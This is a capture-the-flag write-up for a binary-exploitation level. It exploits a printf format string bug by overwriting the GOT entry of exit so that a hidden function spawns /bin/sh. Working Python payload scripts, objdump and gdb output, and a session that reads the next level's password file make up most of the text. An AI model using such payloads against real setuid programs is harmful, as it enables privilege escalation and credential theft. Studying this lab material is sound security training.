# level5

Running the binary seems to echo back what we write in stdin :

```sh
$ ./level5
aaaaa
aaaaa
```

The `main` function looks like this :

```c
void main(void)
{
  n();
  return;
}

```

And the `n` function looks like this :

```c
void n(void)
{
  char buffer[520];
  fgets(buffer,512,stdin);
  printf(buffer);
  exit(1);
}
```

It's again a format string vulnerability. But this time there is a `o` function that seems to be hidden.

```c
void o(void)
{
  system("/bin/sh");
  _exit(1);
}
```

It simply runs `/bin/sh`, so we have to find a way to call it.

First, we need to know where our buffer is in the stack.

```python
import subprocess
import sys
args = ["./level5"]

for i in range(0, 256):
	p = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
	payload = "AAAA" + "%{}$x\n".format(i)
	p.stdin.write(payload)
	p.stdin.flush()
	out = p.stdout.readline().strip()
	if out.decode().endswith("414141"):
        print "Found at index {}".format(i)
        exit(0)
```

This script returns `Found at index 4`.

Since there's a call to `exit` after our call to `printf` we cannot re-write the register `EIP`, since the code doesn't return.

Another cool way to solve this is via overwriting the `GOT` entry of `exit` with the address of `o`.

The Global Offset Table is a table of addresses of functions that are dynamically linked, and is used to resolve the address of a function at runtime.

We can see where every function is in the GOT by using `objdump -R level5`.

```sh
$ objdump -R level5
level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

To generate our payload, exactly like the other two levels, we have to write `0x08049838` characters, then the address of `o` in little endian.

To get the address of `o`, nothing complicated.

```sh
b main
r
p o
$1 = {<text variable, no debug info>} 0x80484a4 <o>
```

```python
import struct

EXIT_ADDY = 0x08049838
O_ADDY    = 0x080484a4

payload = struct.pack("<I", EXIT_ADDY)
payload += "%{}x".format(O_ADDY - len(payload))
payload += "%4$n"
print payload
```

We need to keep a stdin open to send our payload, so we can't use `subprocess.Popen` without tinkering.

A quick solution is just to run the script with a `&& cat -` to re-open a stdin, and pipe the entire thing to `level5`

```sh
(python /tmp/payload.py ; cat -) | ./level5
whoami
level6
id
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
cat /home/user/level6/.pass     
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

And we're done.